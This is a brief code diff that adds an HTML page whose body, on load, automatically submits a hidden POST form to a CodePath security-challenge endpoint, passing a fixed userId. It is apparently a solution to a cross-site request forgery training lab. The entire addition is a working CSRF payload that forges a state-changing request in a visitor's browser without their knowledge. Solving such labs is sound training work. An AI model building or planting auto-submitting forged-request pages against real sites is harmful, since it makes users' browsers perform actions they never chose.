@@ -1,1 +1,9 @@
 #stuff
+<html>
+  <body onload="document.csrfform.submit()">
+    <form name="csrfform" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+      <input type="hidden" name="userId" value="4b8f83b681b706eb2acff708611625dd6a9069cc"/>
+      <input type="submit" value="submit"/>
+    </form>
+  </body>
+</html>
